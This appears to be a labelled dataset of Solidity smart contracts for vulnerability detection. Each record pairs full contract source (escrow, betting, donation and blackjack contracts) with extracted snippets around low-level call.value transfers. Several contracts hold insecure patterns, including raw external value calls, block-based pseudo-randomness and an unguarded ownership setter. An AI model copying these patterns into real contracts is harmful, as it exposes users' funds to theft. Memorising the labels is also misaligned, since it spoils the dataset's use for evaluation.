"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"value\",\"type\":\"uint256\"},{\"indexed\":true,\"name\":\"token\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"extraData\",\"type\":\"bytes\"}],\"name\":\"ReceivedTokens\",\"type\":\"event\"}]'; } } contract Builder is Object { event Builded(address indexed client, address indexed instance); mapping(address => address[]) public getContractsOf; function getLastContract() constant returns (address) { var sender_contracts = getContractsOf[msg.sender]; return sender_contracts[sender_contracts.length - 1]; } address public beneficiary; function setBeneficiary(address _beneficiary) onlyOwner { beneficiary = _beneficiary; } uint public buildingCostWei; function setCost(uint _buildingCostWei) onlyOwner { buildingCostWei = _buildingCostWei; } string public securityCheckURI; function setSecurityCheck(string _uri) onlyOwner { securityCheckURI = _uri; } } contract BuilderCongress is Builder { function create(uint256 minimumQuorumForProposals, uint256 minutesForDebate, int256 marginOfVotesForMajority, address congressLeader, address _client) payable returns (address) { if (buildingCostWei > 0 && beneficiary != 0) { if (msg.value < buildingCostWei) throw; if (!beneficiary.send(buildingCostWei)) throw; if (msg.value > buildingCostWei) { if (!msg.sender.send(msg.value - buildingCostWei)) throw; } } else { if (msg.value > 0) { if (!msg.sender.send(msg.value)) throw; } } if (_client == 0) _client = msg.sender; if (congressLeader == 0) congressLeader = _client; var inst = CreatorCongress.create(minimumQuorumForProposals, minutesForDebate, marginOfVotesForMajority, congressLeader); inst.setOwner(_client); inst.setHammer(_client); getContractsOf[_client].push(inst); Builded(_client, inst); return inst; } } "}
{"sol name": "30101_1.sol", "label": 0, "first path": "function reject(address _participant) onlyOwner public { uint256 weiAmount = deposited[_participant]; require(weiAmount > 0); deposited[_participant] = 0; Rejected(_participant); require(_participant.call.value(weiAmount)()); function rejectMany(address[] _participants) onlyOwner public { for (uint256 i = 0; i < _participants.length; i++) { reject(_participants[i]); ", "second path": "function reject(address _participant) onlyOwner public { uint256 weiAmount = deposited[_participant]; require(weiAmount > 0); deposited[_participant] = 0; Rejected(_participant); require(_participant.call.value(weiAmount)()); function rejectMany(address[] _participants) onlyOwner public { for (uint256 i = 0; i < _participants.length; i++) { reject(_participants[i]); ", "third path": "function reject(address _participant) onlyOwner public { uint256 weiAmount = deposited[_participant]; require(weiAmount > 0); deposited[_participant] = 0; Rejected(_participant); require(_participant.call.value(weiAmount)()); function rejectMany(address[] _participants) onlyOwner public { for (uint256 i = 0; i < _participants.length; i++) { reject(_participants[i]); ", "long path": "pragma solidity ^0.4.18; library SafeMath { function mul(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a * b; assert(a == 0 || c / a == b); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a / b; return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { assert(b <= a); return a - b; } function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; assert(c >= a); return c; } } contract TelcoinSaleCapEscrow { using SafeMath for uint256; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); event WalletChanged(address indexed previousWallet, address indexed newWallet); event ValuePlaced(address indexed purchaser, address indexed beneficiary, uint256 amount); event Approved(address indexed participant, uint256 amount); event Rejected(address indexed participant); event Closed(); address public owner; address public wallet; bool public closed = false; mapping(address => uint256) public deposited; modifier onlyOwner() { require(msg.sender == owner); _; } modifier escrowOpen() { require(!closed); _; } function TelcoinSaleCapEscrow(address _wallet) public payable { require(msg.value > 0); require(_wallet != address(0)); owner = msg.sender; wallet = _wallet; wallet.transfer(msg.value); } function () public payable { placeValue(msg.sender); } function approve(address _participant, uint256 _weiAmount) onlyOwner public { uint256 depositedAmount = deposited[_participant]; require(depositedAmount > 0); require(_weiAmount <= depositedAmount); deposited[_participant] = depositedAmount.sub(_weiAmount); Approved(_participant, _weiAmount); wallet.transfer(_weiAmount); } function approveMany(address[] _participants, uint256[] _weiAmounts) onlyOwner public { require(_participants.length == _weiAmounts.length); for (uint256 i = 0; i < _participants.length; i++) { approve(_participants[i], _weiAmounts[i]); } } function changeWallet(address _wallet) onlyOwner public payable { require(_wallet != 0x0); require(msg.value > 0); WalletChanged(wallet, _wallet); wallet = _wallet; wallet.transfer(msg.value); } function close() onlyOwner public { require(!closed); closed = true; Closed(); } function placeValue(address _beneficiary) escrowOpen public payable { require(_beneficiary != address(0)); uint256 weiAmount = msg.value; require(weiAmount > 0); uint256 newDeposited = deposited[_beneficiary].add(weiAmount); deposited[_beneficiary] = newDeposited; ValuePlaced( msg.sender, _beneficiary, weiAmount ); } function reject(address _participant) onlyOwner public { uint256 weiAmount = deposited[_participant]; require(weiAmount > 0); deposited[_participant] = 0; Rejected(_participant); require(_participant.call.value(weiAmount)()); } function rejectMany(address[] _participants) onlyOwner public { for (uint256 i = 0; i < _participants.length; i++) { reject(_participants[i]); } } function transferOwnership(address _to) onlyOwner public { require(_to != address(0)); OwnershipTransferred(owner, _to); owner = _to; } } "}
{"sol name": "9221_1.sol", "label": 0, "first path": "function bet() payable { if ((random()%2==1) && (msg.value == 1 ether) && (!locked))  { if (!msg.sender.call.value(2 ether)()) throw; function releaseFunds(uint amount) { if (gameOwner==msg.sender)  { if (!msg.sender.call.value( amount * (1 ether))()) throw; ", "second path": "function bet() payable { if ((random()%2==1) && (msg.value == 1 ether) && (!locked))  { if (!msg.sender.call.value(2 ether)()) throw; function releaseFunds(uint amount) { if (gameOwner==msg.sender)  { if (!msg.sender.call.value( amount * (1 ether))()) throw; ", "third path": "function bet() payable { if ((random()%2==1) && (msg.value == 1 ether) && (!locked))  { if (!msg.sender.call.value(2 ether)()) throw; function releaseFunds(uint amount) { if (gameOwner==msg.sender)  { if (!msg.sender.call.value( amount * (1 ether))()) throw; ", "long path": "pragma solidity ^0.4.24; contract EtherBet{ address gameOwner = address(0); bool locked = false; function bet() payable { if ((random()%2==1) && (msg.value == 1 ether) && (!locked))  { if (!msg.sender.call.value(2 ether)()) throw; } } function lock() { if (gameOwner==msg.sender) { locked = true; } } function unlock()  { if (gameOwner==msg.sender) { locked = false; } } function own(address owner) { if ((gameOwner == address(0)) || (gameOwner == msg.sender)) { gameOwner = owner; } } function releaseFunds(uint amount) { if (gameOwner==msg.sender)  { if (!msg.sender.call.value( amount * (1 ether))()) throw; } } function random() view returns (uint8) { return uint8(uint256(keccak256(block.timestamp, block.difficulty))%256); } function () public  payable { bet(); } } "}
{"sol name": "39705_1.sol", "label": 0, "first path": "function empty() returns (bool) { return foundationWallet.call.value(this.balance)(); function donateAs(address addr) private returns (bool) { state st = getState(); if (st != state.round0 && st != state.round1) { throw; } if (msg.value < minDonation) { throw; } if (weiPerCHF == 0) { throw; } totalWeiDonated += msg.value; weiDonated[addr] += msg.value; uint chfCents = (msg.value * 100) / weiPerCHF; bookDonation(addr, now, chfCents, \"ETH\", \"\"); return foundationWallet.call.value(this.balance)(); ", "second path": "function empty() returns (bool) { return foundationWallet.call.value(this.balance)(); function donateAs(address addr) private returns (bool) { state st = getState(); if (st != state.round0 && st != state.round1) { throw; } if (msg.value < minDonation) { throw; } if (weiPerCHF == 0) { throw; } totalWeiDonated += msg.value; weiDonated[addr] += msg.value; uint chfCents = (msg.value * 100) / weiPerCHF; bookDonation(addr, now, chfCents, \"ETH\", \"\"); return foundationWallet.call.value(this.balance)(); ", "third path": "function empty() returns (bool) { return foundationWallet.call.value(this.balance)(); function donateAs(address addr) private returns (bool) { state st = getState(); if (st != state.round0 && st != state.round1) { throw; } if (msg.value < minDonation) { throw; } if (weiPerCHF == 0) { throw; } totalWeiDonated += msg.value; weiDonated[addr] += msg.value; uint chfCents = (msg.value * 100) / weiPerCHF; bookDonation(addr, now, chfCents, \"ETH\", \"\"); return foundationWallet.call.value(this.balance)(); ", "long path": "pragma solidity ^0.4.6; contract TokenTracker { uint public restrictedShare; mapping(address => uint) public tokens; mapping(address => uint) public restrictions; uint public totalRestrictedTokens; uint public totalUnrestrictedTokens; uint public totalRestrictedAssignments; uint public totalUnrestrictedAssignments; bool public assignmentsClosed = false; uint public burnMultDen; uint public burnMultNom; function TokenTracker(uint _restrictedShare) { if (_restrictedShare >= 100) { throw; } restrictedShare = _restrictedShare; } function isUnrestricted() constant returns (bool) { return (assignmentsClosed && totalRestrictedTokens == 0); } function multFracCeiling(uint x, uint a, uint b) returns (uint) { if (a == 0) { return 0; } return (x * a + (b - 1)) / b; } function isRegistered(address addr, bool restricted) constant returns (bool) { if (restricted) { return (restrictions[addr] > 0); } else { return (tokens[addr] > 0); } } function assign(address addr, uint tokenAmount, bool restricted) internal { if (assignmentsClosed) { throw; } tokens[addr] += tokenAmount; if (restricted) { totalRestrictedTokens += tokenAmount; totalRestrictedAssignments += 1; restrictions[addr] += tokenAmount; } else { totalUnrestrictedTokens += tokenAmount; totalUnrestrictedAssignments += 1; } } function closeAssignmentsIfOpen() internal { if (assignmentsClosed) { return; } assignmentsClosed = true; uint totalTokensTarget = (totalUnrestrictedTokens * 100) / (100 - restrictedShare); uint totalTokensExisting = totalRestrictedTokens + totalUnrestrictedTokens; uint totalBurn = 0; if (totalTokensExisting > totalTokensTarget) { totalBurn = totalTokensExisting - totalTokensTarget; } burnMultNom = totalBurn; burnMultDen = totalRestrictedTokens; } function unrestrict(address addr) internal returns (uint) { if (!assignmentsClosed) { throw; } uint restrictionsForAddr = restrictions[addr]; if (restrictionsForAddr == 0) { throw; } uint burn = multFracCeiling(restrictionsForAddr, burnMultNom, burnMultDen); tokens[addr] -= burn; delete restrictions[addr]; totalRestrictedTokens   -= restrictionsForAddr; totalUnrestrictedTokens += restrictionsForAddr - burn; return burn; } } contract Phased { uint[] public phaseEndTime; uint public N; mapping(uint => uint) public maxDelay; function getPhaseAtTime(uint time) constant returns (uint n) { if (time > now) { throw; } while (n < N && phaseEndTime[n] <= time) { n++; } } function isPhase(uint time, uint n) constant returns (bool) { if (time > now) { throw; } if (n >= N) { throw; } if (n > 0 && phaseEndTime[n-1] > time) { return false; } if (n < N && time >= phaseEndTime[n]) { return false; } return true; } function getPhaseStartTime(uint n) constant returns (uint) { if (n == 0) { throw; } return phaseEndTime[n-1]; } function addPhase(uint time) internal { if (N > 0 && time <= phaseEndTime[N-1]) { throw; } if (time <= now) { throw; } phaseEndTime.push(time); N++; } function setMaxDelay(uint i, uint timeDelta) internal { if (i >= N) { throw; } maxDelay[i] = timeDelta; } function delayPhaseEndBy(uint n, uint timeDelta) internal { if (n >= N) { throw; } if (now >= phaseEndTime[n]) { throw; } if (timeDelta > maxDelay[n]) { throw; } maxDelay[n] -= timeDelta; for (uint i = n; i < N; i++) { phaseEndTime[i] += timeDelta; } } function endCurrentPhaseIn(uint timeDelta) internal { uint n = getPhaseAtTime(now); if (n >= N) { throw; } if (timeDelta == 0) { timeDelta = 1; } if (now + timeDelta < phaseEndTime[n]) { phaseEndTime[n] = now + timeDelta; } } } contract StepFunction { uint public phaseLength; uint public nSteps; uint public step; function StepFunction(uint _phaseLength, uint _initialValue, uint _nSteps) { if (_nSteps > _phaseLength) { throw; } step = _initialValue / _nSteps; if ( step * _nSteps != _initialValue) { throw; } phaseLength = _phaseLength; nSteps = _nSteps; } function getStepFunction(uint elapsedTime) constant returns (uint) { if (elapsedTime >= phaseLength) { throw; } uint timeLeft  = phaseLength - elapsedTime - 1; uint stepsLeft = ((nSteps + 1) * timeLeft) / phaseLength; return stepsLeft * step; } } contract Targets { mapping(uint => uint) public counter; mapping(uint => uint) public target; function targetReached(uint id) constant returns (bool) { return (counter[id] >= target[id]); } function setTarget(uint id, uint _target) internal { target[id] = _target; } function addTowardsTarget(uint id, uint amount) internal returns (bool firstReached) { firstReached = (counter[id] < target[id]) && (counter[id] + amount >= target[id]); counter[id] += amount; } } contract Parameters { uint public constant round0StartTime      = 1484676000; uint public constant round1StartTime      = 1495040400; uint public constant round0EndTime        = round0StartTime + 6 weeks; uint public constant round1EndTime        = round1StartTime + 6 weeks; uint public constant finalizeStartTime    = round1EndTime   + 1 weeks; uint public constant finalizeEndTime      = finalizeStartTime + 1000 years; uint public constant maxRoundDelay     = 270 days; uint public constant gracePeriodAfterRound0Target  = 1 days; uint public constant gracePeriodAfterRound1Target  = 0 days; uint public constant tokensPerCHF = 10; uint public constant minDonation = 1 ether; uint public constant round0Bonus = 200; uint public constant round1InitialBonus = 25; uint public constant round1BonusSteps = 5; uint public constant millionInCents = 10**6 * 100; uint public constant round0Target = 1 * millionInCents; uint public constant round1Target = 20 * millionInCents; uint public constant earlyContribShare = 22; } contract FDC is TokenTracker, Phased, StepFunction, Targets, Parameters { string public name; enum state { pause, earlyContrib, round0, round1, offChainReg, finalization, done } mapping(uint => state) stateOfPhase; mapping(bytes32 => bool) memoUsed; address[] public donorList; address[] public earlyContribList; uint public weiPerCHF; uint public totalWeiDonated; mapping(address => uint) public weiDonated; address public foundationWallet; address public registrarAuth; address public exchangeRateAuth; address public masterAuth; uint phaseOfRound0; uint phaseOfRound1; event DonationReceipt (address indexed addr, string indexed currency, uint indexed bonusMultiplierApplied, uint timestamp, uint tokenAmount, bytes32 memo); event EarlyContribReceipt (address indexed addr, uint tokenAmount, bytes32 memo); event BurnReceipt (address indexed addr, uint tokenAmountBurned); function FDC(address _masterAuth, string _name) TokenTracker(earlyContribShare) StepFunction(round1EndTime-round1StartTime, round1InitialBonus, round1BonusSteps) { name = _name; foundationWallet  = _masterAuth; masterAuth     = _masterAuth; exchangeRateAuth  = _masterAuth; registrarAuth  = _masterAuth; stateOfPhase[0] = state.earlyContrib; addPhase(round0StartTime); stateOfPhase[1] = state.round0; addPhase(round0EndTime); stateOfPhase[2] = state.offChainReg; addPhase(round1StartTime); stateOfPhase[3] = state.round1; addPhase(round1EndTime); stateOfPhase[4] = state.offChainReg; addPhase(finalizeStartTime); stateOfPhase[5] = state.finalization; addPhase(finalizeEndTime); stateOfPhase[6] = state.done; phaseOfRound0 = 1; phaseOfRound1 = 3; setMaxDelay(phaseOfRound0 - 1, maxRoundDelay); setMaxDelay(phaseOfRound1 - 1, maxRoundDelay); setTarget(phaseOfRound0, round0Target); setTarget(phaseOfRound1, round1Target); } function getState() constant returns (state) { return stateOfPhase[getPhaseAtTime(now)]; } function getMultiplierAtTime(uint time) constant returns (uint) { uint n = getPhaseAtTime(time); if (stateOfPhase[n] == state.round0) { return 100 + round0Bonus; } if (stateOfPhase[n] == state.round1) { return 100 + getStepFunction(time - getPhaseStartTime(n)); } throw; } function donateAsWithChecksum(address addr, bytes4 checksum) payable returns (bool) { bytes32 hash = sha256(addr); if (bytes4(hash) != checksum) { throw ; } return donateAs(addr); } function finalize(address addr) { if (getState() != state.finalization) { throw; } closeAssignmentsIfOpen(); uint tokensBurned = unrestrict(addr); BurnReceipt(addr, tokensBurned); if (isUnrestricted()) { endCurrentPhaseIn(0); } } function empty() returns (bool) { return foundationWallet.call.value(this.balance)(); } function getStatus(uint donationRound, address dfnAddr, address fwdAddr) public constant returns ( state currentState, uint fxRate, uint currentMultiplier, uint donationCount, uint totalTokenAmount, uint startTime, uint endTime, bool isTargetReached, uint chfCentsDonated, uint tokenAmount, uint fwdBalance, uint donated) { currentState = getState(); if (currentState == state.round0 || currentState == state.round1) { currentMultiplier = getMultiplierAtTime(now); } fxRate = weiPerCHF; donationCount = totalUnrestrictedAssignments; totalTokenAmount = totalUnrestrictedTokens; if (donationRound == 0) { startTime = getPhaseStartTime(phaseOfRound0); endTime = getPhaseStartTime(phaseOfRound0 + 1); isTargetReached = targetReached(phaseOfRound0); chfCentsDonated = counter[phaseOfRound0]; } else { startTime = getPhaseStartTime(phaseOfRound1); endTime = getPhaseStartTime(phaseOfRound1 + 1); isTargetReached = targetReached(phaseOfRound1); chfCentsDonated = counter[phaseOfRound1]; } tokenAmount = tokens[dfnAddr]; donated = weiDonated[dfnAddr]; fwdBalance = fwdAddr.balance; } function setWeiPerCHF(uint weis) { if (msg.sender != exchangeRateAuth) { throw; } weiPerCHF = weis; } function registerEarlyContrib(address addr, uint tokenAmount, bytes32 memo) { if (msg.sender != registrarAuth) { throw; } if (getState() != state.earlyContrib) { throw; } if (!isRegistered(addr, true)) { earlyContribList.push(addr); } assign(addr, tokenAmount, true); EarlyContribReceipt(addr, tokenAmount, memo); } function registerOffChainDonation(address addr, uint timestamp, uint chfCents, string currency, bytes32 memo) { if (msg.sender != registrarAuth) { throw; } uint currentPhase = getPhaseAtTime(now); state currentState = stateOfPhase[currentPhase]; if (currentState != state.round0 && currentState != state.round1 && currentState != state.offChainReg) { throw; } if (timestamp > now) { throw; } uint timestampPhase = getPhaseAtTime(timestamp); state timestampState = stateOfPhase[timestampPhase]; if ((currentState == state.round0 || currentState == state.round1) && (timestampState != currentState)) { throw; } if (currentState == state.offChainReg && timestampPhase != currentPhase-1) { throw; } if (memoUsed[memo]) { throw; } memoUsed[memo] = true; bookDonation(addr, timestamp, chfCents, currency, memo); } function delayDonPhase(uint donPhase, uint timedelta) { if (msg.sender != registrarAuth) { throw; } if (donPhase == 0) { delayPhaseEndBy(phaseOfRound0 - 1, timedelta); } else if (donPhase == 1) { delayPhaseEndBy(phaseOfRound1 - 1, timedelta); } } function setFoundationWallet(address newAddr) { if (msg.sender != masterAuth) { throw; } if (getPhaseAtTime(now) >= phaseOfRound0) { throw; } foundationWallet = newAddr; } function setExchangeRateAuth(address newAuth) { if (msg.sender != masterAuth) { throw; } exchangeRateAuth = newAuth; } function setRegistrarAuth(address newAuth) { if (msg.sender != masterAuth) { throw; } registrarAuth = newAuth; } function setMasterAuth(address newAuth) { if (msg.sender != masterAuth) { throw; } masterAuth = newAuth; } function donateAs(address addr) private returns (bool) { state st = getState(); if (st != state.round0 && st != state.round1) { throw; } if (msg.value < minDonation) { throw; } if (weiPerCHF == 0) { throw; } totalWeiDonated += msg.value; weiDonated[addr] += msg.value; uint chfCents = (msg.value * 100) / weiPerCHF; bookDonation(addr, now, chfCents, \"ETH\", \"\"); return foundationWallet.call.value(this.balance)(); } function bookDonation(address addr, uint timestamp, uint chfCents, string currency, bytes32 memo) private { uint phase = getPhaseAtTime(timestamp); bool targetReached = addTowardsTarget(phase, chfCents); if (targetReached && phase == getPhaseAtTime(now)) { if (phase == phaseOfRound0) { endCurrentPhaseIn(gracePeriodAfterRound0Target); } else if (phase == phaseOfRound1) { endCurrentPhaseIn(gracePeriodAfterRound1Target); } } uint bonusMultiplier = getMultiplierAtTime(timestamp); chfCents = (chfCents * bonusMultiplier) / 100; uint tokenAmount = (chfCents * tokensPerCHF) / 100; if (!isRegistered(addr, false)) { donorList.push(addr); } assign(addr,tokenAmount,false); DonationReceipt(addr, currency, bonusMultiplier, timestamp, tokenAmount, memo); } } "}
{"sol name": "39664_1.sol", "label": 0, "first path": "function migrateBlockjack() only(ADMIN_CONTRACT) { stopBlockjack(); if (currentBankroll > initialBankroll) { if (!ADMIN_CONTRACT.call.value(currentBankroll - initialBankroll)()) throw; suicide(DX); function shareProfits() onlyOwner { if (profitsLockedUntil > now) throw; if (currentBankroll <= initialBankroll) throw; uint256 profit = currentBankroll - initialBankroll; if (!ADMIN_CONTRACT.call.value(profit)()) throw; currentBankroll -= profit; bankrollLockedUntil = now + BANKROLL_LOCK_PERIOD; profitsLockedUntil = bankrollLockedUntil + BANKROLL_LOCK_PERIOD; ", "second path": "function migrateBlockjack() only(ADMIN_CONTRACT) { stopBlockjack(); if (currentBankroll > initialBankroll) { if (!ADMIN_CONTRACT.call.value(currentBankroll - initialBankroll)()) throw; suicide(DX); function shareProfits() onlyOwner { if (profitsLockedUntil > now) throw; if (currentBankroll <= initialBankroll) throw; uint256 profit = currentBankroll - initialBankroll; if (!ADMIN_CONTRACT.call.value(profit)()) throw; currentBankroll -= profit; bankrollLockedUntil = now + BANKROLL_LOCK_PERIOD; profitsLockedUntil = bankrollLockedUntil + BANKROLL_LOCK_PERIOD; ", "third path": "function migrateBlockjack() only(ADMIN_CONTRACT) { stopBlockjack(); if (currentBankroll > initialBankroll) { if (!ADMIN_CONTRACT.call.value(currentBankroll - initialBankroll)()) throw; suicide(DX); function shareProfits() onlyOwner { if (profitsLockedUntil > now) throw; if (currentBankroll <= initialBankroll) throw; uint256 profit = currentBankroll - initialBankroll; if (!ADMIN_CONTRACT.call.value(profit)()) throw; currentBankroll -= profit; bankrollLockedUntil = now + BANKROLL_LOCK_PERIOD; profitsLockedUntil = bankrollLockedUntil + BANKROLL_LOCK_PERIOD; ", "long path": "library ArrayLib { function insertInPlace(uint8[] storage self, uint8 n) { uint8 insertingIndex = 0; while (self.length > 0 && insertingIndex < self.length && self[insertingIndex] < n) { insertingIndex += 1; } self.length += 1; for (uint8 i = uint8(self.length) - 1; i > insertingIndex; i--) { self[i] = self[i - 1]; } self[insertingIndex] = n; } } library DeckLib { using ArrayLib for uint8[]; enum Suit { Spades, Hearts, Clubs, Diamonds } uint8 constant cardsPerSuit = 13; uint8 constant suits = 4; uint8 constant totalCards = cardsPerSuit * suits; struct Deck { uint8[] usedCards; address player; uint256 gameID; } function init(Deck storage self, uint256 gameID)  { self.usedCards = new uint8[](0); self.player = msg.sender; self.gameID = gameID; } function getCard(Deck storage self, uint256 blockNumber)  returns (uint8)  { uint cardIndex = self.usedCards.length; if (cardIndex >= totalCards) throw; uint8 r = uint8(getRandomNumber(blockNumber, self.player, self.gameID, cardIndex, totalCards - cardIndex)); for (uint8 i = 0; i < cardIndex; i++) { if (self.usedCards[i] <= r) r += 1; } self.usedCards.insertInPlace(r); return r; } function cardDescription(uint8 self) constant returns (Suit, uint8) { return (Suit(self / cardsPerSuit), cardFacevalue(self)); } function cardEmojified(uint8 self) constant returns (uint8, string) { string memory emojiSuit; var (suit, number) = cardDescription(self); if (suit == Suit.Clubs) emojiSuit = \"\u2663\ufe0f\"; else if (suit == Suit.Diamonds) emojiSuit = \"\u2666\ufe0f\"; else if (suit == Suit.Hearts) emojiSuit = \"\u2665\ufe0f\"; else if (suit == Suit.Spades) emojiSuit = \"\u2660\ufe0f\"; return (number, emojiSuit); } function cardFacevalue(uint8 self) constant returns (uint8) { return 1 + self % cardsPerSuit; } function blackjackValue(uint8 self) constant returns (uint8) { uint8 cardValue = cardFacevalue(self); return cardValue < 10 ? cardValue : 10; } function getRandomNumber(uint b, address player, uint256 gameID, uint n, uint m) constant returns (uint) { bytes32 blockHash = block.blockhash(b); if (blockHash == 0x0) throw; return uint(uint256(keccak256(blockHash, player, gameID, n)) % m); } } contract AbstractBlockjackLogs { event GameEnded(uint256 gameID, address player, uint gameResult, uint256 payout, uint8 playerHand, uint8 houseHand); event GameNeedsTick(uint256 gameID, address player, uint256 actionBlock); function recordLog(uint256 gameID, address player, uint gameResult, uint256 payout, uint8 playerHand, uint8 houseHand); function tickRequiredLog(uint256 gameID, address player, uint256 actionBlock); } library GameLib { using DeckLib for *; uint8 constant houseLimit = 17; uint8 constant target = 21; enum ComparaisonResult { First, Second, Tie } enum GameState { InitialCards, Waiting, Hit, Stand, DoubleDown, Finished } enum GameResult { Ongoing, House, Tie, Player, PlayerNatural } struct Game { address player; uint256 bet; uint256 payout; uint256 gameID; DeckLib.Deck deck; uint8[] houseCards; uint8[] playerCards; uint256 actionBlock; GameState state; GameResult result; bool closed; } function init(Game storage self, uint256 gameID) { self.player = msg.sender; self.bet = msg.value; self.payout = 0; self.houseCards = new uint8[](0); self.playerCards = new uint8[](0); self.actionBlock = block.number; self.state = GameState.InitialCards; self.result = GameResult.Ongoing; self.closed = false; self.gameID = gameID; self.deck.init(gameID); } function tick(Game storage self) returns (bool) { if (block.number <= self.actionBlock) return false; if (self.actionBlock + 255 < block.number) { endGame(self, GameResult.House); return true; } if (!needsTick(self)) return true; if (self.state == GameState.InitialCards) dealInitialCards(self); if (self.state == GameState.Hit) dealHitCard(self); if (self.state == GameState.DoubleDown) { if (!canDoubleDown(self)) throw; self.bet += msg.value; dealHitCard(self); forceStand(self); } if (self.state == GameState.Stand) { dealHouseCards(self); checkGameResult(self); } else { checkGameContinues(self); } return true; } function needsTick(Game storage self) constant returns (bool) { if (self.state == GameState.Waiting) return false; if (self.state == GameState.Finished) return false; return true; } function checkGameResult(Game storage self)  { uint8 houseHand = countHand(self.houseCards); if (houseHand == target && self.houseCards.length == 2) return endGame(self, GameResult.House); ComparaisonResult result = compareHands(houseHand, countHand(self.playerCards)); if (result == ComparaisonResult.First) return endGame(self, GameResult.House); if (result == ComparaisonResult.Second) return endGame(self, GameResult.Player); endGame(self, GameResult.Tie); } function checkGameContinues(Game storage self)  { uint8 playerHand = countHand(self.playerCards); if (playerHand == target && self.playerCards.length == 2) return endGame(self, GameResult.PlayerNatural); if (playerHand > target) return endGame(self, GameResult.House); if (playerHand == target) { forceStand(self); if (!tick(self)) throw; } } function forceStand(Game storage self) { uint256 currentActionBlock = self.actionBlock; playerDecision(self, GameState.Stand); self.actionBlock = currentActionBlock; } function canDoubleDown(Game storage self) returns (bool) { if (self.playerCards.length > 2) return false; uint8 totalPlayer = countHand(self.playerCards); if (totalPlayer < 9 || totalPlayer > 11) return false; if (msg.value != self.bet) return false; } function playerDecision(Game storage self, GameState decision)  { if (self.state != GameState.Waiting) throw; if (decision != GameState.Hit && decision != GameState.Stand) throw; self.state = decision; self.actionBlock = block.number; } function dealInitialCards(Game storage self) private { self.playerCards.push(self.deck.getCard(self.actionBlock)); self.houseCards.push(self.deck.getCard(self.actionBlock)); self.playerCards.push(self.deck.getCard(self.actionBlock)); self.state = GameState.Waiting; } function dealHitCard(Game storage self) private { self.playerCards.push(self.deck.getCard(self.actionBlock)); self.state = GameState.Waiting; } function dealHouseCards(Game storage self) private { self.houseCards.push(self.deck.getCard(self.actionBlock)); if (countHand(self.houseCards) < houseLimit) dealHouseCards(self); } function endGame(Game storage self, GameResult result) { self.result = result; self.state = GameState.Finished; self.payout = payoutForResult(self.result, self.bet); closeGame(self); } function closeGame(Game storage self) private { if (self.closed) throw; if (self.state != GameState.Finished) throw; self.closed = true; if (self.payout > 0) { if (!self.player.send(self.payout)) throw; } } function payoutForResult(GameResult result, uint256 bet) private returns (uint256) { if (result == GameResult.PlayerNatural) return bet * 5 / 2; if (result == GameResult.Player) return bet * 2; if (result == GameResult.Tie) return bet; return 0; } function countHand(uint8[] memory hand)  returns (uint8) { uint8[] memory possibleSums = new uint8[](1); for (uint i = 0; i < hand.length; i++) { uint8 value = hand[i].blackjackValue(); uint l = possibleSums.length; for (uint j = 0; j < l; j++) { possibleSums[j] += value; if (value == 1) { possibleSums = appendArray(possibleSums, possibleSums[j] + 10); } } } return bestSum(possibleSums); } function bestSum(uint8[] possibleSums)  returns (uint8 bestSum) { bestSum = 50; for (uint i = 0; i < possibleSums.length; i++) { if (compareHands(bestSum, possibleSums[i]) == ComparaisonResult.Second) { bestSum = possibleSums[i]; } } return; } function appendArray(uint8[] memory array, uint8 n)  returns (uint8[] memory) { uint8[] memory newArray = new uint8[](array.length + 1); for (uint8 i = 0; i < array.length; i++) { newArray[i] = array[i]; } newArray[array.length] = n; return newArray; } function compareHands(uint8 a, uint8 b)  returns (ComparaisonResult) { if (a <= target && b <= target) { if (a > b) return ComparaisonResult.First; if (a < b) return ComparaisonResult.Second; } if (a > target && b > target) { if (a < b) return ComparaisonResult.First; if (a > b) return ComparaisonResult.Second; } if (a > target) return ComparaisonResult.Second; if (b > target) return ComparaisonResult.First; return ComparaisonResult.Tie; } } contract Blockjack { AbstractBlockjackLogs blockjacklogs; using GameLib for GameLib.Game; GameLib.Game[] games; mapping (address => uint256) public currentGame; bool contractCleared; uint256 public minBet = 50 finney; uint256 public maxBet = 500 finney; bool public allowsNewGames = false; uint256 public maxBlockActions = 10; mapping (uint256 => uint256) blockActions; address public DX = 0x296Ae1d2D9A8701e113EcdF6cE986a4a7D0A6dC5; address public DEV = 0xBC4343B11B7cfdd6dD635f61039b8a66aF6E73Bb; address public ADMIN_CONTRACT; uint256 public BANKROLL_LOCK_PERIOD = 30 days; uint256 public bankrollLockedUntil; uint256 public profitsLockedUntil; uint256 public initialBankroll; uint256 public currentBankroll; mapping (address => bool) public isOwner; modifier onlyOwner { if (!isOwner[msg.sender]) throw; _; } modifier only(address x) { if (msg.sender != x) throw; _; } modifier onlyPlayer(uint256 gameID) { if (msg.sender != games[gameID].player) throw; _; } modifier blockActionProtected { blockActions[block.number] += 1; if (blockActions[block.number] > maxBlockActions) throw; _; } function Blockjack(address _admin_contract, address _logs_contract) { ADMIN_CONTRACT = _admin_contract; blockjacklogs = AbstractBlockjackLogs(_logs_contract); games.length += 1; games[0].init(0); games[0].player = this; setupTrustedAccounts(); } function () payable { startGame(); } function startGame() blockActionProtected payable { if (!allowsNewGames) throw; if (msg.value < minBet) throw; if (msg.value > maxBet) throw; uint256 currentGameId = currentGame[msg.sender]; if (games.length > currentGameId) { GameLib.Game openedGame = games[currentGameId]; if (openedGame.player == msg.sender && !openedGame.closed) { if (!openedGame.tick()) throw; if (!openedGame.closed) throw; recordEndedGame(currentGameId); } } uint256 newGameID = games.length; games.length += 1; games[newGameID].init(newGameID); currentGame[msg.sender] = newGameID; tickRequiredLog(games[newGameID]); } function hit(uint256 gameID) onlyPlayer(gameID) blockActionProtected { GameLib.Game game = games[gameID]; if (!game.tick()) throw; game.playerDecision(GameLib.GameState.Hit); tickRequiredLog(game); } function doubleDown(uint256 gameID) onlyPlayer(gameID) blockActionProtected payable { GameLib.Game game = games[gameID]; if (!game.tick()) throw; game.playerDecision(GameLib.GameState.DoubleDown); tickRequiredLog(game); } function stand(uint256 gameID) onlyPlayer(gameID) blockActionProtected { GameLib.Game game = games[gameID]; if (!game.tick()) throw; game.playerDecision(GameLib.GameState.Stand); tickRequiredLog(game); } function gameTick(uint256 gameID) blockActionProtected { GameLib.Game openedGame = games[gameID]; if 